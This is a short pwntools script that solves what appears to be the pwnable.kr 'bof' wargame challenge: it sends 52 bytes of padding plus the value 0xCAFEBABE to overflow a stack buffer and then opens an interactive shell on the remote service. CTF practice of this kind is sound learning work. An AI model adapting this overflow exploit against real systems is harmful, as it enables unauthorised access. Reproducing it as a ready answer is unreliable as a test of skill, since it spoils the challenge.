from pwn import *;
a = remote("pwnable.kr", 9000)
a.sendline(b'a'*52 + p32(0xCAFEBABE))
a.interactive()
